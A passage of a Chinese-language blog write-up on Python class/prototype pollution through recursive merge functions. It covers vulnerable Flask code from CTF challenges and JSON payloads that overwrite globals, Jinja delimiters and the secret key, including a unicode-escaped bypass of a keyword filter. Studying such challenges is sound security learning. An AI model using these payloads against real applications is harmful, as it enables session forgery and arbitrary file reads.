+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> request<span style="color:#666">.</span>data:
+</span></span><span style="display:flex;"><span>        merge(json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data), instance)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;flag in ./flag but heres only static/index.html&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#666">.</span>run(host<span style="color:#666">=</span><span style="color:#b44">&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><p>这里是利用特性</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload<span style="color:#666">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;os&#34;</span>:{
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;path&#34;</span>:{
+</span></span><span style="display:flex;"><span>                    <span style="color:#b44">&#34;pardir&#34;</span>:<span style="color:#b44">&#34;,&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="ssti-jinja2污染">SSTI jinja2污染 <a href="#ssti-jinja2%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h4><p>这里就只贴出恶意链，不具体分析了，其实就是走的ssti的底层，去改掉模板的标识符</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span> : {
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;app&#34;</span> : {
+</span></span><span style="display:flex;"><span>                    <span style="color:#b44">&#34;jinja_env&#34;</span> :{
+</span></span><span style="display:flex;"><span><span style="color:#b44">&#34;variable_start_string&#34;</span> : <span style="color:#b44">&#34;[[&#34;</span>,<span style="color:#b44">&#34;variable_end_string&#34;</span>:<span style="color:#b44">&#34;]]&#34;</span>
+</span></span><span style="display:flex;"><span>}        
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><h1 id="赛题">赛题 <a href="#%e8%b5%9b%e9%a2%98" class="anchor">🔗</a></h1><h2 id="ctfshow西瓜杯">CTFshow西瓜杯 <a href="#ctfshow%e8%a5%bf%e7%93%9c%e6%9d%af" class="anchor">🔗</a></h2><div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">flask</span> <span style="color:#a2f;font-weight:bold">import</span> Flask, session, redirect, url_for,request,render_template
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">hashlib</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">json</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">re</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">generate_random_md5</span>():
+</span></span><span style="display:flex;"><span>    random_string <span style="color:#666">=</span> os<span style="color:#666">.</span>urandom(<span style="color:#666">16</span>)
+</span></span><span style="display:flex;"><span>    md5_hash <span style="color:#666">=</span> hashlib<span style="color:#666">.</span>md5(random_string)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> md5_hash<span style="color:#666">.</span>hexdigest()
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">filter</span>(user_input):
+</span></span><span style="display:flex;"><span>    blacklisted_patterns <span style="color:#666">=</span> [<span style="color:#b44">&#39;init&#39;</span>, <span style="color:#b44">&#39;global&#39;</span>, <span style="color:#b44">&#39;env&#39;</span>, <span style="color:#b44">&#39;app&#39;</span>, <span style="color:#b44">&#39;_&#39;</span>, <span style="color:#b44">&#39;string&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> pattern <span style="color:#a2f;font-weight:bold">in</span> blacklisted_patterns:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> re<span style="color:#666">.</span>search(pattern, user_input, re<span style="color:#666">.</span>IGNORECASE):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#666">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#666">.</span>secret_key <span style="color:#666">=</span> generate_random_md5()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">evil</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">index</span>():
+</span></span><span style="display:flex;"><span>    username <span style="color:#666">=</span> request<span style="color:#666">.</span>form<span style="color:#666">.</span>get(<span style="color:#b44">&#39;username&#39;</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#666">=</span> request<span style="color:#666">.</span>form<span style="color:#666">.</span>get(<span style="color:#b44">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>    session[<span style="color:#b44">&#34;username&#34;</span>] <span style="color:#666">=</span> username
+</span></span><span style="display:flex;"><span>    session[<span style="color:#b44">&#34;password&#34;</span>] <span style="color:#666">=</span> password
+</span></span><span style="display:flex;"><span>    Evil <span style="color:#666">=</span> evil()
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> request<span style="color:#666">.</span>data:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">filter</span>(<span style="color:#a2f">str</span>(request<span style="color:#666">.</span>data)):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            merge(json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data), Evil)
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> render_template(<span style="color:#b44">&#34;index.html&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/admin&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>, <span style="color:#b44">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">templates</span>():
+</span></span><span style="display:flex;"><span>    username <span style="color:#666">=</span> session<span style="color:#666">.</span>get(<span style="color:#b44">&#34;username&#34;</span>, <span style="color:#a2f;font-weight:bold">None</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#666">=</span> session<span style="color:#666">.</span>get(<span style="color:#b44">&#34;password&#34;</span>, <span style="color:#a2f;font-weight:bold">None</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> username <span style="color:#a2f;font-weight:bold">and</span> password:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> username <span style="color:#666">==</span> <span style="color:#b44">&#34;adminer&#34;</span> <span style="color:#a2f;font-weight:bold">and</span> password <span style="color:#666">==</span> app<span style="color:#666">.</span>secret_key:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> render_template(<span style="color:#b44">&#34;flag.html&#34;</span>, flag<span style="color:#666">=</span><span style="color:#a2f">open</span>(<span style="color:#b44">&#34;/flag&#34;</span>, <span style="color:#b44">&#34;rt&#34;</span>)<span style="color:#666">.</span>read())
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;Unauthorized&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">f</span><span style="color:#b44">&#39;Hello,  This is the POLLUTED page.&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#b44">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#666">.</span>run(host<span style="color:#666">=</span><span style="color:#b44">&#39;0.0.0.0&#39;</span>, port<span style="color:#666">=</span><span style="color:#666">5000</span>)
+</span></span></code></pre></div><p>python的原型链污染，需要把<code>app.secret_key</code>污染成一个我们想要的值，接着把 <code>_static_folder</code>的路径污染成服务器的根目录，实现任意文件读取从而得到flag。
+因为有waf所以这里就unicode一下</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&#34;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&#34;\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#008000;font-weight:bold">&#34;\u0061\u0070\u0070&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#008000;font-weight:bold">&#34;\u006A\u0069\u006E\u006A\u0061\u005F\u0065\u006E\u0076&#34;</span>: {
+</span></span><span style="display:flex;"><span>                    <span style="color:#008000;font-weight:bold">&#34;\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u005F\u0073\u0074\u0061\u0072\u0074\u005F\u0073\u0074\u0072\u0069\u006E\u0067&#34;</span>: <span style="color:#b44">&#34;[#&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#008000;font-weight:bold">&#34;\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u005F\u0065\u006E\u0064\u005F\u0073\u0074\u0072\u0069\u006E\u0067&#34;</span>: <span style="color:#b44">&#34;#]&#34;</span>
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                <span style="color:#008000;font-weight:bold">&#34;config&#34;</span> : {
+</span></span><span style="display:flex;"><span>                    <span style="color:#008000;font-weight:bold">&#34;\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059&#34;</span> :<span style="color:#b44">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后发包伪造seesion即可</p>
+<h2 id="downunderctf-2024---co2">DownUnderCTF 2024 - co2 <a href="#downunderctf-2024---co2" class="anchor">🔗</a></h2><p>在utils中</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span></code></pre></div><p>写了一个merge</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#34;/save_feedback&#34;</span>, methods<span style="color:#666">=</span>[<span style="color:#b44">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@login_required</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">save_feedback</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#666">=</span> json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data)
+</span></span><span style="display:flex;"><span>    feedback <span style="color:#666">=</span> Feedback()
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.</span>
+</span></span><span style="display:flex;"><span>    merge(data, feedback)
+</span></span><span style="display:flex;"><span>    save_feedback_to_disk(feedback)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> jsonify({<span style="color:#b44">&#34;success&#34;</span>: <span style="color:#b44">&#34;true&#34;</span>}), <span style="color:#666">200</span>
+</span></span></code></pre></div><p>并且在这里进行了调用</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#34;/get_flag&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@login_required</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">get_flag</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> flag <span style="color:#666">==</span> <span style="color:#b44">&#34;true&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;DUCTF</span><span style="color:#b68;font-weight:bold">{NOT_THE_REAL_FLAG}</span><span style="color:#b44">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;Nope&#34;</span>
+</span></span></code></pre></div><p>只需要污染flag的bool值即可</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{ <span style="color:#b44">&#34;__init__&#34;</span> : { <span style="color:#b44">&#34;__globals__&#34;</span> : { <span style="color:#b44">&#34;flag&#34;</span> : <span style="color:#b44">&#34;true&#34;</span> } } }
+</span></span></code></pre></div><h1 id="总结">总结 <a href="#%e6%80%bb%e7%bb%93" class="anchor">🔗</a></h1><p>原型链污染挺好玩的hhh，不知道其他语言有没有这个洞嘞。</p>
+    </div>
+
+    
+        <div class="tags">
+            
+                <a href="https://bubbleo0O.github.io/tags/python">Python</a>
+            
+        </div>
+    
+    
+    
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="your-github-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-stackoverflow-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>stackoverflow</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-488.000000, -1163.000000)">
+            <g id="stackoverflow" transform="translate(488.000000, 1163.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M42.0860128,53.5922927 L22.9745951,53.6011499 L22.9729497,49.5538824 L42.0835447,49.5440929 L42.0860128,53.5922927 L42.0860128,53.5922927 Z M55,30.6708298 L51.7306912,12 L47.7087256,12.6920259 L50.9775643,31.3628557 L55,30.6708298 L55,30.6708298 Z M42.5455518,44.3547147 L23.5156994,42.616026 L23.1410164,46.6470941 L42.1712214,48.3841513 L42.5455518,44.3547147 L42.5455518,44.3547147 Z M43.8009984,39.0731519 L25.3459811,34.1539179 L24.285633,38.0621508 L42.7419431,42.9819676 L43.8009984,39.0731519 L43.8009984,39.0731519 Z M46.2103463,34.4436411 L29.7494464,24.8164635 L27.6748215,28.3015328 L44.1365441,37.9292931 L46.2103463,34.4436411 L46.2103463,34.4436411 Z M50.2466504,31.6088756 L46.8745036,33.8883189 L36.106599,18.2318456 L39.4792159,15.9517031 L50.2466504,31.6088756 Z M45.3315807,40.2784283 L48.5799693,40.2784283 L48.5799693,60 L17,60 L17,40.2784283 L20.2648427,40.2784283 L20.2648427,56.8243495 L45.3315807,56.8243495 L45.3315807,40.2784283 Z" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-twitter-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2024 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Bubble
+    
+    </div>
+
+    
+      <div class="powerby">
+        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
+      </div>
+    
+</footer>
+
+
+
+  </body>
+</html>
